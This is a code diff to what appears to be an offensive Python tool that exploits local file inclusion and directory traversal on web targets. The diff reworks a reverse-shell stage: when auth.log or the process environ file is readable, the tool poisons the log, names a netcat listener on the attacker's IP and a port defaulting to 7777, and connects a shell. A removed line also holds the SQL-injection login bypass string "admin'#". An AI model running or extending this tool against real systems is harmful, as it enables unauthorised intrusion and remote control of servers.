@@ -182,8 +182,8 @@ class Read_File:
                     request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                  Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                  ('Cookie',str(self.Cookie).replace('\n','')),
-                                 ('username',"admin'#"),
-                                 ('password','password')]
+                                 ('username',f"{self.args.user}"),
+                                 ('password',f'{self.args.password}')]
                     try: 
                       self._first_req = request.open(self.args.Vulnurl).read()                                                      
                       self.Get_Oregnal_URL = request.open(self.url).read() 
@@ -216,7 +216,9 @@ class Read_File:
                            print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
                            print('\n'+'='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
                            print("[+] Vulnerable  Link    : ................ | : "+self.url.replace('\n',''))                           
-                           Read_File.file_name (self,**kwargs)                          
+                           Read_File.file_name (self,**kwargs) 
+                           from Package.FileStore import FileManager
+                           FileManager.FileRStore_Write(self,args=self.control)                         
                            print('\n'+'='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
                            print("[+] File request        : ................ | : "+self.args.read.replace('_',"/")) 
                            print("[+] Full Path           : ................ | : "+self.LFI.replace('\n',''))
@@ -225,17 +227,26 @@ class Read_File:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read)  
                            else:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read) 
-                           if self.args.shell:
+                           if self.args.shell :
                                 if  "auth" in  self.url or "auth.log" in  self.url\
-                                or "environ" in self.url: 
+                                or "environ" in self.url : 
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
-                                    print("[+] Mothead              : ................ | : enjaction log file  ")
+                                    if self.args.port: 
+                                        with open("./Package/shell/.port",'w') as port:
+                                            port.write(self.args.port)
+                                
+                                    print("[+] Mothead              : ................ | : injecting log file  ")
                                     print("[+] Lisliner Tool        : ................ | : NETCAT ")
-                                    print("[+] Lisliner IP          : ................ | :",self.ip_re)   
-                                    print("[+] Lisliner Port        : ................ | : 7777") 
-                                    from Package.LFT_Shell_connect  import Shell_conncet
+                                    print("[+] Lisliner IP          : ................ | :",self.args.shell)   
+                                    if not self.args.port:
+                                        if os.path.exists("./Package/shell/.port"):
+                                            os.remove("./Package/shell/.port")
+                                        print("[+] Lisliner Port        : ................ | : 7777") 
+                                    else:
+                                       print("[+] Lisliner Port        : ................ | : " + self.args.port)   
+                                    from Package.LFT_Shell_connect import Shell_conncet
                                     Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                     exit()
                                 else:
@@ -268,30 +279,28 @@ class Read_File:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re+'/'+self.args.read) 
                            else:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re+'/'+self.args.read)              
-                           if self.args.shell or self.args.port:
+                           if self.args.shell :
                                 if  "auth" in  self.url or "auth.log" in  self.url\
-                                or "environ" in self.url or self.args.port: 
+                                or "environ" in self.url : 
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
                                     if self.args.port: 
-                                         with open("./Package/shell/.port",'w') as port:
-                                              port.write(self.args.port)
-                                         print("[+] Mothead              : ................ | : read shell file  ")
-                                         print("[+] Lisliner Tool        : ................ | : NETCAT ")
-                                         print("[+] Lisliner Port        : ................ | :",self.args.port) 
-                                         print("[+] Lisliner IP          : ................ | : 0.0.0.0")
-                                         from Package.LFT_Shell_connect import Shell_conncet
-                                         Shell_conncet.Connect_SSh_Shell(self,args = self.control)
-                                         exit()
-                                    else:
-                                        print("[+] Mothead              : ................ | : enjaction log file  ")
-                                        print("[+] Lisliner Tool        : ................ | : NETCAT ")
-                                        print("[+] Lisliner IP          : ................ | :",self.args.shell)   
+                                        with open("./Package/shell/.port",'w') as port:
+                                            port.write(self.args.port)
+                                
+                                    print("[+] Mothead              : ................ | : injecting log file  ")
+                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
+                                    print("[+] Lisliner IP          : ................ | :",self.args.shell)   
+                                    if not self.args.port:
+                                        if os.path.exists("./Package/shell/.port"):
+                                            os.remove("./Package/shell/.port")
                                         print("[+] Lisliner Port        : ................ | : 7777") 
-                                        from Package.LFT_Shell_connect import Shell_conncet
-                                        Shell_conncet.Connect_SSh_Shell(self,args = self.control)
-                                        exit()
+                                    else:
+                                       print("[+] Lisliner Port        : ................ | : " + self.args.port)   
+                                    from Package.LFT_Shell_connect import Shell_conncet
+                                    Shell_conncet.Connect_SSh_Shell(self,args = self.control)
+                                    exit()
                                 else:
                                       print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                       time.sleep(1)
@@ -324,7 +333,7 @@ class Read_File:
           self.args.read = str("".join(re.findall('=.+',self.url)))\
           .replace("/","_").replace("=",'').replace(".",'')
         else:
-           self.args.read = re.sub(r'/','_',self.args.read,flags=re.MULTILINE)   
+            self.args.read = re.sub(r'/','_',self.args.read,flags=re.MULTILINE)   
         with open (".RQData",'w')as RQ :
              RQ.write(str(self._first_req))   
    except Exception  as a :
